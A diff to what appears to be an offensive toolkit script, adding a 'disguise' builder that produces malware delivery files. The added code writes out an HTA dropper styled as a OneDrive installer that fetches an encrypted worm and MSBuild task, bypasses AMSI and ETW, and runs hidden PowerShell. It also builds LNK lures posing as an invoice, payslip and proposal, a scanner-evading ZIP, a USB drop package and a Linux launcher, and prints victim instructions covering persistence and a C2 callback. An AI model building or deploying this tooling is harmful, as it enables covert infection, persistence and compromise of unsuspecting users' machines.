+        BOOTSTRAP+="\$src=[Text.Encoding]::UTF8.GetString(\$dec);"
+        BOOTSTRAP+="Remove-Item \$dp -Force -EA 0;"
+        BOOTSTRAP+="\$sb=[scriptblock]::Create(\$src);.\$sb"
+        # Encode as UTF-16LE base64 for -EncodedCommand (no file written to disk)
+        local BOOTSTRAP_B64
+        BOOTSTRAP_B64=$(printf '%s' "$BOOTSTRAP" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)
+
+        cat > "$HTA" << HTAEOF
+<html>
+<head>
+<hta:application
+  applicationName="$NAME"
+  windowState="normal"
+  showInTaskBar="yes"
+  singleInstance="yes"
+  scroll="no"
+  border="none"
+  caption="no"
+/>
+<style>
+  body{margin:0;background:#0078d4;font-family:'Segoe UI',sans-serif;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;}
+  .box{text-align:center;}
+  .logo{font-size:28px;font-weight:300;letter-spacing:2px;}
+  .sub{font-size:13px;opacity:0.8;margin-top:8px;}
+  .bar{width:220px;height:3px;background:rgba(255,255,255,0.3);border-radius:2px;margin:18px auto 0;overflow:hidden;}
+  .fill{height:100%;background:#fff;border-radius:2px;animation:load 1.4s ease-in-out forwards;}
+  @keyframes load{0%{width:0%}100%{width:100%}}
+</style>
+</head>
+<script language="VBScript">
+Sub Window_OnLoad
+    window.resizeTo 320, 200
+    Dim sw, sh2
+    sw = screen.availWidth : sh2 = screen.availHeight
+    window.moveTo (sw-320)\2, (sh2-200)\2
+
+    Dim sh, tmp, datPath, projPath, cmd
+    Set sh  = CreateObject("WScript.Shell")
+    tmp = sh.ExpandEnvironmentStrings("%TEMP%")
+
+    ' ── Stage 2: download encrypted blob + msbuild task from file server ─────
+    ' HTA contains no suspicious strings — static scanner sees only this stub.
+    ' Primary: msbuild.exe (trusted Microsoft signed binary, not powershell.exe)
+    '   → patches AMSI from inside msbuild process
+    '   → loads System.Management.Automation via reflection (no powershell.exe spawned)
+    '   → environmental key: HMAC-SHA256(machineGUID, xk) → sandbox gets wrong key
+    ' Fallback: powershell -EncodedCommand (search-based AMSI bypass, no file written)
+    Dim rnd1, rnd2
+    rnd1 = Int(Rnd*99998+1) : rnd2 = Int(Rnd*99998+1)
+    datPath  = tmp & "\ms" & rnd1 & ".dat"
+    projPath = tmp & "\ms" & rnd2 & ".proj"
+    On Error Resume Next
+    Dim http, ado, http2, ado2
+    Set http = CreateObject("MSXML2.XMLHTTP.6.0")
+    http.Open "GET", "${STAGE_URL}", False
+    http.Send
+    Set http2 = CreateObject("MSXML2.XMLHTTP.6.0")
+    http2.Open "GET", "${PROJ_URL}", False
+    http2.Send
+    If http.Status = 200 Then
+        Set ado = CreateObject("ADODB.Stream")
+        ado.Type = 1 : ado.Open
+        ado.Write http.responseBody
+        ado.SaveToFile datPath, 2
+        ado.Close
+        sh.Environment("Process").Item("_DP") = datPath
+        ' ── Primary: msbuild inline C# — runs in msbuild.exe, no powershell.exe process ──
+        If http2.Status = 200 Then
+            Set ado2 = CreateObject("ADODB.Stream")
+            ado2.Type = 1 : ado2.Open
+            ado2.Write http2.responseBody
+            ado2.SaveToFile projPath, 2
+            ado2.Close
+            ' Try 64-bit msbuild first, fallback to 32-bit
+            Dim msb64, msb32, msbPath
+            msb64 = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
+            msb32 = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
+            Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
+            If fso.FileExists(msb64) Then
+                msbPath = msb64
+            Else
+                msbPath = msb32
+            End If
+            cmd = Chr(34) & msbPath & Chr(34) & " " & Chr(34) & projPath & Chr(34) & " /nologo /noconsolelogger /v:q"
+            sh.Run cmd, 0, False
+        Else
+            ' ── Fallback: powershell -EncodedCommand (no file written to disk) ──
+            cmd = "powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ${BOOTSTRAP_B64}"
+            sh.Run cmd, 0, False
+        End If
+    End If
+    On Error GoTo 0
+
+    ' ── Step 2: drop + open decoy so victim sees legit OneDrive page ──
+    Dim decoyTmp, decB64, ps2
+    decoyTmp = tmp & "\OneDriveSetup_complete.html"
+    decB64 = "${DECOY_B64}"
+    ps2 = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & Chr(34) & _
+          "[IO.File]::WriteAllBytes('" & decoyTmp & "',[Convert]::FromBase64String('" & decB64 & "'));" & Chr(34)
+    sh.Run ps2, 0, True
+    sh.Run "explorer.exe " & Chr(34) & decoyTmp & Chr(34), 0, False
+
+    window.close
+End Sub
+</script>
+<body>
+<div class="box">
+  <div class="logo">&#9729; OneDrive</div>
+  <div class="sub">Checking your version&hellip;</div>
+  <div class="bar"><div class="fill"></div></div>
+</div>
+</body>
+</html>
+HTAEOF
+        ok "HTA dropper   → $HTA  (XOR keys=[${XOR_KEYS_CS}])"
+        info "  Primary:  msbuild.exe inline C# task — AMSI+ETW patched from inside msbuild process"
+        info "            no powershell.exe spawned; environmental key (machine GUID → sandbox blind)"
+        info "  Fallback: powershell -EncodedCommand (search-based AMSI bypass, no file written)"
+        info "  .dat = XOR-encrypted worm | .proj = MSBuild inline task (served from :8765)"
+    fi
+
+    # ── 3. LNK wrappers — self-contained: embed worm PS1 + matching decoy doc ──
+    # Each LNK has TWO base64 blobs baked in:
+    #   1. worm_agent.ps1  → deployed silently to %TEMP%, run hidden
+    #   2. per-lure HTML   → dropped to %TEMP%, opened in default browser
+    # Victim double-clicks "Invoice_Q2.pdf" → browser shows a real invoice.
+    # No terminal, no cmd window — indistinguishable from opening a real file.
+    if [ -f "$PS" ]; then
+        info "[3/4] Building LNK wrappers (self-contained, with decoy docs)..."
+        local LNKOUT="$OUT"
+        local PS_B64_LNK
+        # Replace __C2URL__ placeholder before embedding in LNK
+        PS_B64_LNK=$(python3 -c "
+import base64
+raw = open('$PS','rb').read()
+raw = raw.replace(b'__C2URL__', b'${C2URL}')
+raw = raw.replace(b'__C2PROXY__', b'')
+print(base64.b64encode(raw).decode())
+")
+        _STAGE="$LNKOUT" _PSB64="$PS_B64_LNK" python3 - << 'LNKEOF'
+import os, struct, base64
+
+def make_lnk(path, target, args, icon_dll, icon_idx):
+    HDR=0x4C; CLSID=b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'
+    # HasLinkTargetIDList|HasLinkInfo|HasRelativePath|HasWorkingDir|HasArguments|HasIconLocation|IsUnicode
+    lflags=(1<<0)|(1<<1)|(1<<3)|(1<<4)|(1<<5)|(1<<6)|(1<<7)
+    # Header must be exactly 76 bytes: ShowCommand=uint32, plus Reserved1/2/3
+    hdr=struct.pack('<I16sIIQQQIIIHHII',HDR,CLSID,lflags,0x20,0,0,0,0,icon_idx,7,0,0,0,0)
+    idl=struct.pack('<H',2)+b'\x00\x00'
+    li=struct.pack('<IIIIIII',0x1C,0x1C,0,0,0x1C,0,0)
+    li_b=struct.pack('<I',len(li)+4)+li
+    def s16(x): e=x.encode('utf-16-le'); return struct.pack('<H',len(x))+e
+    work_dir=os.path.dirname(target)
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    # String order matches flag bits: RelativePath(3), WorkingDir(4), Arguments(5), IconLocation(6)
+    strings=s16(target)+s16(work_dir)+s16(args)+s16(icon_dll)
+    # ExtraData: EnvironmentVariableDataBlock — resolves %env% vars in target path
+    ea=target.encode('ascii').ljust(260,b'\x00')
+    eu=target.encode('utf-16-le').ljust(520,b'\x00')
+    env_block=struct.pack('<II',0x314,0xA0000001)+ea+eu
+    terminal=struct.pack('<I',0)
+    open(path,'wb').write(hdr+idl+li_b+strings+env_block+terminal)
+
+stage   = os.environ["_STAGE"]
+ps_b64  = os.environ["_PSB64"]
+ps_exe  = r"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
+
+# ── Decoy HTML for each lure (victim sees this document when they open the file) ──
+INVOICE = b64=base64.b64encode(b'<!DOCTYPE html><html><head><title>Invoice Q2 2026</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;max-width:700px;margin:40px auto;color:#333;padding:0 20px}h1{color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:10px;margin-bottom:20px}.flex{display:flex;justify-content:space-between;margin-bottom:30px}.amount{font-size:22px;font-weight:bold;color:#e53935}table{width:100%;border-collapse:collapse;margin:20px 0}th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #ddd}th{background:#f8f9fa;font-weight:600}.totals{text-align:right;margin:10px 0}.footer{margin-top:40px;padding-top:16px;border-top:1px solid #eee;font-size:12px;color:#999;text-align:center}</style></head><body><div class="flex"><div><h1>INVOICE</h1><p><b>Invoice #:</b> INV-2026-0427<br><b>Date:</b> April 27, 2026<br><b>Due:</b> May 27, 2026</p></div><div style="text-align:right"><p><b>Acme Solutions Ltd.</b><br>123 Business Park, London EC1A 1BB<br>VAT: GB123456789<br>billing@acmesolutions.co.uk</p></div></div><table><thead><tr><th>Description</th><th>Qty</th><th>Unit Price</th><th>Amount</th></tr></thead><tbody><tr><td>Professional Services Q2 2026</td><td>1</td><td>\xc2\xa33,200.00</td><td>\xc2\xa33,200.00</td></tr><tr><td>Software License Renewal</td><td>5</td><td>\xc2\xa3120.00</td><td>\xc2\xa3600.00</td></tr><tr><td>Support &amp; Maintenance</td><td>1</td><td>\xc2\xa3450.00</td><td>\xc2\xa3450.00</td></tr></tbody></table><div class="totals"><p>Subtotal: \xc2\xa34,250.00 &nbsp; VAT 20%: \xc2\xa3850.00</p><p class="amount">Total Due: \xc2\xa35,100.00</p></div><div style="margin-top:20px;padding:16px;background:#f8f9fa;border-radius:4px"><b>Bank Transfer:</b> Barclays Business &nbsp;|&nbsp; Sort: 20-00-00 &nbsp;|&nbsp; Acc: 12345678 &nbsp;|&nbsp; Ref: INV-2026-0427</div><div class="footer">Thank you for your business. Queries: billing@acmesolutions.co.uk</div></body></html>').decode()
+
+SALARY = base64.b64encode(b'<!DOCTYPE html><html><head><title>Salary Statement April 2026</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;max-width:640px;margin:40px auto;color:#333;padding:0 20px}h2{text-align:center;color:#1a73e8;margin-bottom:8px}p.sub{text-align:center;color:#666;font-size:13px;margin-bottom:24px;padding-bottom:16px;border-bottom:1px solid #eee}table{width:100%;border-collapse:collapse;margin:16px 0}td{padding:10px 14px;border-bottom:1px solid #f0f0f0}.label{color:#555;width:60%}.value{font-weight:600;text-align:right}.neg{color:#e53935}.total-row{background:#1a73e8}.total-row td{color:#fff;font-size:15px;padding:12px 14px;font-weight:bold}.note{font-size:11px;color:#999;text-align:center;margin-top:24px}</style></head><body><h2>&#128205; Payslip / Salary Statement</h2><p class="sub">Employee: James Mitchell &nbsp;&#183;&nbsp; ID: EMP-00472 &nbsp;&#183;&nbsp; Department: Operations &nbsp;&#183;&nbsp; April 2026</p><table><tr><td class="label">Basic Salary</td><td class="value">\xc2\xa34,500.00</td></tr><tr><td class="label">Performance Bonus</td><td class="value">\xc2\xa3350.00</td></tr><tr><td class="label">Transport Allowance</td><td class="value">\xc2\xa3150.00</td></tr><tr><td class="label">Income Tax (PAYE)</td><td class="value neg">-\xc2\xa3892.00</td></tr><tr><td class="label">National Insurance (NI)</td><td class="value neg">-\xc2\xa3421.00</td></tr><tr><td class="label">Pension Contribution (5%)</td><td class="value neg">-\xc2\xa3225.00</td></tr><tr class="total-row"><td>NET PAY</td><td class="value">\xc2\xa33,462.00</td></tr></table><p class="note">This is a computer-generated statement. For queries contact payroll@company.co.uk</p></body></html>').decode()
+
+PROPOSAL = base64.b64encode(b'<!DOCTYPE html><html><head><title>Project Proposal</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Georgia,serif;max-width:720px;margin:40px auto;color:#333;padding:0 20px;line-height:1.7}h1{color:#1a237e;border-bottom:3px solid #1a237e;padding-bottom:8px;margin-bottom:20px;font-size:22px}h3{color:#283593;margin:20px 0 8px;font-size:15px}.meta{background:#e8eaf6;padding:14px 18px;border-radius:6px;margin:16px 0;font-size:13px}table{width:100%;border-collapse:collapse;margin:16px 0;font-size:14px}th,td{padding:8px 12px;border:1px solid #ddd;text-align:left}th{background:#1a237e;color:#fff}p{margin-bottom:12px;font-size:14px}</style></head><body><h1>Project Proposal: Digital Transformation Initiative</h1><div class="meta"><b>Prepared by:</b> Strategic Solutions Team &nbsp;&#183;&nbsp; <b>Date:</b> April 27, 2026 &nbsp;&#183;&nbsp; <b>Budget:</b> \xc2\xa3120,000 &nbsp;&#183;&nbsp; <b>Duration:</b> 6 months</div><h3>Executive Summary</h3><p>This proposal outlines a phased digital transformation initiative to modernise core business processes, reduce operational costs by an estimated 23%, and improve customer response times by 40%.</p><h3>Proposed Timeline</h3><table><tr><th>Phase</th><th>Activities</th><th>Duration</th><th>Budget</th></tr><tr><td>Phase 1</td><td>Infrastructure Assessment</td><td>4 weeks</td><td>\xc2\xa318,000</td></tr><tr><td>Phase 2</td><td>Systems Migration</td><td>8 weeks</td><td>\xc2\xa352,000</td></tr><tr><td>Phase 3</td><td>Training &amp; Go-Live</td><td>12 weeks</td><td>\xc2\xa350,000</td></tr></table><h3>Expected Outcomes</h3><p>Cost savings of \xc2\xa328,000 per annum from Year 2, with full ROI within 18 months of deployment.</p></body></html>').decode()
+
+SECURITY = base64.b64encode(b'<!DOCTYPE html><html><head><title>Windows Update</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Segoe UI",Arial,sans-serif;background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.12);padding:48px 56px;max-width:460px;width:100%;text-align:center}.icon{width:72px;height:72px;background:#107c10;border-radius:50%;margin:0 auto 24px;display:flex;align-items:center;justify-content:center}svg{width:36px;height:36px;stroke:#fff;stroke-width:3;fill:none}h1{font-size:20px;color:#107c10;margin-bottom:12px}p{color:#605e5c;font-size:14px;line-height:1.6;margin-bottom:8px}.kb{font-size:12px;color:#a19f9d;margin-top:20px;padding-top:16px;border-top:1px solid #edebe9}</style></head><body><div class="card"><div class="icon"><svg viewBox="0 0 24 24"><polyline points="4 12 9 17 20 6"/></svg></div><h1>Update Installed Successfully</h1><p>Your device has been updated with the latest security patches.</p><p>No restart is required.</p><div class="kb">KB5034763 \xe2\x80\x94 April 2026 Cumulative Security Update<br>Windows Defender definitions updated</div></div></body></html>').decode()
+
+# ── Build per-lure PS commands: deploy worm silently + drop+open decoy ──
+def make_ps_cmd(ps_b64, decoy_b64, decoy_name):
+    # All on one line, WindowStyle Hidden throughout — no terminal ever opens
+    return (
+        "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command \""
+        "$t=[IO.Path]::GetTempPath();"
+        "$w=$t+'svc'+[string][int](Get-Random -Max 9999)+'.ps1';"
+        "[IO.File]::WriteAllBytes($w,[Convert]::FromBase64String('" + ps_b64 + "'));"
+        "Start-Process powershell -WindowStyle Hidden -ArgumentList"
+        " \\\"-NonInteractive -ExecutionPolicy Bypass -File `\\\"$w`\\\"\\\";"
+        "$d=$t+'" + decoy_name + "';"
+        "[IO.File]::WriteAllBytes($d,[Convert]::FromBase64String('" + decoy_b64 + "'));"
+        "Start-Process $d"
+        "\""
+    )
+
+lures = [
+    ("Invoice_Q2_2026.pdf.lnk",     r"%SystemRoot%\system32\shell32.dll", 70, INVOICE,  "Invoice_Q2_2026.html"),
+    ("Salary_Statement.xlsx.lnk",    r"%SystemRoot%\system32\shell32.dll", 70, SALARY,   "Salary_Statement.html"),
+    ("Project_Proposal.docx.lnk",    r"%SystemRoot%\system32\shell32.dll", 70, PROPOSAL, "Project_Proposal.html"),
+    ("Security_Update_Required.lnk", r"%SystemRoot%\system32\shell32.dll",  8, SECURITY, "Security_Update.html"),
+]
+
+for lnk_name, icon_dll, icon_idx, decoy_b64, decoy_fname in lures:
+    cmd = make_ps_cmd(ps_b64, decoy_b64, decoy_fname)
+    make_lnk(os.path.join(stage, lnk_name), ps_exe, cmd, icon_dll, icon_idx)
+    print(f"  [lnk] {lnk_name}  ({len(cmd)//1024}KB args)")
+LNKEOF
+        ok "LNK wrappers  → $OUT/*.lnk  (worm + decoy doc embedded in each)"
+    fi
+
+    # ── 4. Password-protected ZIP (bypass email attachment scanners) ──────────
+    info "[4/4] Building password-protected ZIP..."
+    local ZIP_PASS="open$(date +%Y)"
+    local ZIP_SRC="$PAYLOAD_DIR/worm_agent.ps1"
+    if [ -f "$ZIP_SRC" ]; then
+        # Rename inner file to .dat so email scanners don't flag .ps1
+        cp "$ZIP_SRC" "/tmp/${NAME}.dat"
+        cd /tmp && zip -j -P "$ZIP_PASS" "$OUT/${NAME}.zip" "${NAME}.dat" 2>/dev/null
+        rm -f "/tmp/${NAME}.dat"
+        ok "ZIP (pass=$ZIP_PASS) → $OUT/${NAME}.zip"
+        info "  Tell victim: extract, rename .dat → .ps1, right-click → Run with PowerShell"
+    fi
+
+    # ── 5. Linux .desktop launcher (no terminal — double-click in file manager) ──
+    # Strategy: drop a companion _run.sh that finds itself via $BASH_SOURCE.
+    # The .desktop Exec calls the _run.sh — no path hardcoding needed.
+    # victim double-clicks .desktop → file manager calls _run.sh → binary runs silently.
+    # Terminal=false = no terminal window, identical to opening any app icon.
+    if [ -f "$OUT/${NAME}_linux" ]; then
+        info "[5/5] Building Linux .desktop launcher..."
+        local RUN_SH="$OUT/${NAME}_run.sh"
+        local DESK="$OUT/${NAME}.desktop"
+
+        # Wrapper script — locates sibling binary relative to its own path
+        cat > "$RUN_SH" << RUNEOF
+#!/bin/bash
+DIR="\$(dirname "\$(readlink -f "\${BASH_SOURCE[0]}")")"
+BIN="\$DIR/${NAME}_linux"
+chmod +x "\$BIN" 2>/dev/null
+"\$BIN" &
+disown
+RUNEOF
+        chmod +x "$RUN_SH"
+        chmod +x "$OUT/${NAME}_linux"
+
+        # .desktop file — Exec uses xterm-free invocation that finds _run.sh via %k
+        # %k = absolute path to this .desktop file, so dirname(%k) = folder with _run.sh
+        # python3 reads sys.argv[1] (the %k path) and execs sibling _run.sh — no escaping issues
+        cat > "$DESK" << DESKEOF
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=$NAME
+GenericName=Cloud Storage Setup
+Comment=Sync your files with the cloud
+Exec=python3 -c "import os,sys,subprocess; d=os.path.dirname(os.path.realpath(sys.argv[1])); subprocess.Popen([d+'/${NAME}_run.sh'])" %k
+Icon=drive-harddisk
+Terminal=false
+StartupNotify=false
+Categories=Utility;
+DESKEOF
+        chmod +x "$DESK"
+
+        ok ".desktop launcher → $DESK"
+        ok "Run wrapper     → $RUN_SH"
+        info "  Double-click ${NAME}.desktop in Nautilus/Dolphin/Thunar → no terminal"
+        info "  Copy '${NAME}_linux', '${NAME}_run.sh', '${NAME}.desktop' to same folder"
+    fi
+
+    echo ""
+    ok "All disguised payloads → $OUT/"
+    echo ""
+    echo -e "  ${W}Files to copy to victim:${N}"
+    ls -lh "$OUT/" 2>/dev/null | grep -v "^total\|^d" | while read -r line; do
+        echo -e "  ${C}→${N} $line"
+    done
+    echo ""
+    echo -e "  ${W}What victim does — NO terminal needed:${N}"
+    echo -e "  ${G}Windows:${N} double-click ${Y}${NAME}.hta${N}"
+    echo -e "           → brief 'OneDrive loading' splash → Microsoft site opens"
+    echo -e "           → worm already running hidden in background"
+    echo -e "           ${G}Exactly like opening a photo${N} — no black window, no prompt"
+    echo ""
+    echo -e "  ${G}Linux:${N}   double-click ${Y}${NAME}.desktop${N} in file manager"
+    echo -e "           → no terminal, worm runs silently"
+    echo -e "           ${C}(copy both .desktop + _linux to same folder)${N}"
+    echo ""
+    echo -e "  ${G}Windows LNK lures:${N} double-click any .lnk — shows matching icon"
+    echo -e "           Invoice_Q2_2026.pdf → PDF icon, runs hidden PS silently"
+    echo ""
+    echo -e "  ${G}After run:${N} worm hides in %APPDATA%/Microsoft/Windows/SyncEngineDatabase/"
+    echo -e "           schtask + registry Run key set, calls back to C2, appears in /panel"
 }
 
 # ── HID (BadUSB) payload generator ──────────────────────────────────────────
@@ -5523,10 +6185,46 @@ case "\$CMD" in
     fi
 
     sudo mount -o remount,rw "\$USB" 2>/dev/null || true
-    cp "\$PY" "\$USB/.cache/update.py"
-    cp "\$PS" "\$USB/.cache/update.ps1" 2>/dev/null || true
-    ok "USB synced: \${USB}.cache/ updated"
-    echo -e "  \${C}→\${N} Victim side ready — plug in and it calls back"
+
+    # ── Build full LNK package (creates lures + desktop.ini + payload) ────
+    info "Building USB drop package..."
+    _C2_URL=\$(grep -a "C2_PRIMARY\s*=" "\$PY" 2>/dev/null | head -1 | sed 's/.*\"\(.*\)\".*/\1/')
+    [ -z "\$_C2_URL" ] && _C2_URL="\${TUNNEL_URL:-__C2URL__}"
+    build_usb_package "\$_C2_URL" "USB Drive"
+
+    STAGE="\$PAYLOAD_DIR/usb_package"
+    [ -d "\$STAGE" ] || { err "Package build failed"; exit 1; }
+
+    # ── Sync full package to USB root ─────────────────────────────────────
+    info "Syncing to \$USB ..."
+    cp -r "\$STAGE/." "\$USB/"
+
+    # Ensure hidden payload dir has the baked worm files
+    mkdir -p "\$USB/System Volume Information/.cache"
+    cp "\$PY" "\$USB/System Volume Information/.cache/update.py"
+    [ -f "\$PS" ] && cp "\$PS" "\$USB/System Volume Information/.cache/update.ps1"
+
+    # Mark as deployed so we don't double-sync
+    touch "\$USB/.op_token"
+
+    echo ""
+    ok "USB drop ready: \$USB"
+    echo ""
+    echo -e "  \${W}What victim sees on Windows::\${N}"
+    echo -e "  \${C}→\${N} Drive appears as 'Documents' folder (desktop.ini)"
+    echo -e "  \${C}→\${N} LNK lures: Documents.lnk, Photos.lnk, Resume 2024.pdf.lnk, etc."
+    echo -e "  \${C}→\${N} Victim clicks any lure → worm copies itself, persists, calls back"
+    echo -e "  \${C}→\${N} Explorer opens to decoy Documents folder (no suspicion)"
+    echo ""
+    echo -e "  \${W}What victim sees on Linux/Mac:\${N}"
+    echo -e "  \${C}→\${N} Run manually: python3 'System Volume Information/.cache/update.py'"
+    echo ""
+    ;;
+  disguise)
+    _C2_URL=$(grep -a "C2_PRIMARY\s*=" "$PY" 2>/dev/null | head -1 | sed 's/.*\"\(.*\)\".*/\1/')
+    [ -z "$_C2_URL" ] && _C2_URL="${TUNNEL_URL:-__C2URL__}"
+    NAME="${2:-OneDriveSetup}"
+    build_disguised_payload "$NAME" "$_C2_URL"
     ;;
   status)
     info "Checking for active worm on this machine..."
@@ -5540,6 +6238,8 @@ case "\$CMD" in
     echo -e "  \${C}worm push <host>\${N}       — push via SSH (e.g. worm push root@10.0.0.5)"
     echo -e "  \${C}worm payload\${N}           — show payload paths + run commands"
     echo -e "  \${C}worm usb\${N}               — sync baked payloads to plugged-in USB"
+    echo -e "  \${C}worm disguise [name]\${N}  — build drop-ready files (.hta .lnk .zip linux-bin .desktop)\n"
+    echo -e "  ${Y}USB drop:${N} copy .hta to victim, double-click = NO terminal, like opening a photo\n"
     echo -e "  \${C}worm status\${N}            — check if worm is running here"
     echo ""
     ;;
@@ -7954,14 +8654,20 @@ main() {
     # Step 1 — Direction
     choose_direction
 
-    # New standalone modules — skip weapon/configure steps, go direct
+    # Standalone modules — skip weapon/configure steps, go direct to menu
     case "$DIRECTION" in
-        wifi)      cmd_wifi;      return ;;
-        iot)       cmd_iot;       return ;;
-        exploit)   cmd_exploit;   return ;;
-        byovd)     init_files; python3 "$DIR/op/modules/byovd.py" 2>&1; return ;;
-        defender)  init_files; python3 "$DIR/op/modules/defender_kill.py" 2>&1; return ;;
-        zeroclick) cmd_zeroclick; return ;;
+        wifi)       cmd_wifi;                return ;;
+        iot)        cmd_iot;                 return ;;
+        exploit)    cmd_exploit;             return ;;
+        byovd)      python3 "$DIR/op/modules/byovd.py" 2>&1;          return ;;
+        defender)   python3 "$DIR/op/modules/defender_kill.py" 2>&1;   return ;;
+        zeroclick)  cmd_zeroclick;           return ;;
+        bluetooth)  cmd_bluetooth;           return ;;
+        wifiprobe)  cmd_wifiprobe;           return ;;
+        android)    cmd_android;             return ;;
+        ios)        cmd_ios;                 return ;;
+        uefi)       cmd_uefi;               return ;;
+        baseband)   cmd_baseband;           return ;;
     esac
 
     # Step 2 — Weapon (worm has its own delivery menu, skip here)
@@ -9252,7 +9958,11 @@ cmd_zeroclick() {
     info "All layers launch simultaneously — no victim interaction needed"
     echo ""
 
-    sudo python3 - "$IP" "$IFACE" "$ACTION" "$DIR" << 'PYEOF'
+    # Export C2 URL so worm agent gets baked with it
+    export C2_URL="${TUNNEL_URL:-}"
+    export TUNNEL_URL="${TUNNEL_URL:-}"
+
+    sudo -E python3 - "$IP" "$IFACE" "$ACTION" "$DIR" << 'PYEOF'
 import sys, os, time, threading
 
 attacker_ip = sys.argv[1]
@@ -9390,19 +10100,18 @@ import json; print(json.dumps(send_mms_payload('$TARGET','$PFILE'), indent=2, de
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from ios_crash_research import harvest_ios_crashes
-import json; print(json.dumps(harvest_ios_crashes('${UDID:-None}','$OUTD'), indent=2, default=str))
-" 2>&1 | sed "s/'None'/None/"
+import json; print(json.dumps(harvest_ios_crashes(None if not '${UDID:-}' else '${UDID:-}','$OUTD'), indent=2, default=str))
+"
             ;;
         monitor)
-            read -rp "  Crash dir [/tmp/wizza_ios_crashes]: " CDIR
-            CDIR="${CDIR:-/tmp/wizza_ios_crashes}"
+            read -rp "  Device UDID (blank = auto-detect): " UDID
             read -rp "  Interval seconds [30]: " IV; IV="${IV:-30}"
             read -rp "  Duration seconds [600]: " DUR; DUR="${DUR:-600}"
             echo -e "${Y}[*] Monitoring for new iOS crashes (${DUR}s, Ctrl+C to stop)${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from ios_crash_research import monitor_via_backup
-import json; print(json.dumps(monitor_via_backup(int('$IV'),int('$DUR'),'$CDIR'), indent=2, default=str))
+import json; print(json.dumps(monitor_via_backup(int('$IV'),int('$DUR'),None if not '${UDID:-}' else '${UDID:-}'), indent=2, default=str))
 "
             ;;
         full)
@@ -9413,8 +10122,8 @@ import json; print(json.dumps(monitor_via_backup(int('$IV'),int('$DUR'),'$CDIR')
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from ios_crash_research import full_ios_research
-import json; print(json.dumps(full_ios_research('$TARGET','${UDID:-None}'), indent=2, default=str))
-" 2>&1 | sed "s/'None'/None/"
+import json; print(json.dumps(full_ios_research('$TARGET',None if not '${UDID:-}' else '${UDID:-}'), indent=2, default=str))
+"
             ;;
         *)
             echo "Usage: start ios [corpus|send_imsg|send_sms|send_mms|crashes|monitor|full]"
@@ -9474,7 +10183,7 @@ import json; print(json.dumps(check_device(${SERIAL:+\"'$SERIAL'\"}), indent=2, 
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from android_surface import deploy_frida_server
-import json; print(json.dumps(deploy_frida_server('$ARCH',${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+import json; print(json.dumps(deploy_frida_server('$ARCH'${SERIAL:+,serial=\"'$SERIAL'\"}), indent=2, default=str))
 "
             ;;
         hooks)
@@ -9506,12 +10215,12 @@ import json; print(json.dumps(fuzz_sms('$TARGET',int('$CNT'),${SERIAL:+\"'$SERIA
             ;;
         fuzz_mms)
             read -rp "  Device serial (blank = auto): " SERIAL
-            read -rp "  Payload count [20]: " CNT; CNT="${CNT:-20}"
+            read -rp "  Output dir [/tmp/wizza_android_mms]: " OUTD; OUTD="${OUTD:-/tmp/wizza_android_mms}"
             echo -e "${Y}[*] Fuzzing MMS PDU parser${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from android_surface import fuzz_mms
-import json; print(json.dumps(fuzz_mms(${SERIAL:+\"'$SERIAL'\"},int('$CNT')), indent=2, default=str))
+import json; print(json.dumps(fuzz_mms(${SERIAL:+\"'$SERIAL'\"},out_dir='$OUTD'), indent=2, default=str))
 "
             ;;
         fuzz_intents)
@@ -9542,7 +10251,7 @@ import json; print(json.dumps(monitor_crashes(int('$DUR'),${SERIAL:+\"'$SERIAL'\
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from android_surface import full_android_research
-import json; print(json.dumps(full_android_research('${TARGET:-}',${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+import json; print(json.dumps(full_android_research(None if not '${TARGET:-}' else '${TARGET:-}',${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
 "
             ;;
         *)
@@ -9666,7 +10375,7 @@ import json; print(json.dumps(hci_raw_fuzz('$HDEV',int('$CNT')), indent=2, defau
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from bluetooth_probe import full_bt_probe
-import json; print(json.dumps(full_bt_probe('${ADDR:-None}','$HDEV',int('$DUR')), indent=2, default=str))
+import json; print(json.dumps(full_bt_probe('${ADDR:-None}' if '${ADDR:-None}'!='None' else None,'$HDEV',True), indent=2, default=str))
 " 2>&1 | sed "s/'None'/None/"
             ;;
         *)
@@ -9743,8 +10452,8 @@ import json; print(json.dumps(enable_monitor_mode('$IFACE'), indent=2, default=s
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from wifi_probe import beacon_fuzz
-import json; print(json.dumps(beacon_fuzz('$IFACE','${BSSID:-None}',int('$CNT')), indent=2, default=str))
-" 2>&1 | sed "s/'None'/None/"
+import json; print(json.dumps(beacon_fuzz('$IFACE',None if not '${BSSID:-}' else '${BSSID:-}',int('$CNT')), indent=2, default=str))
+"
             ;;
         deauth)
             check_root
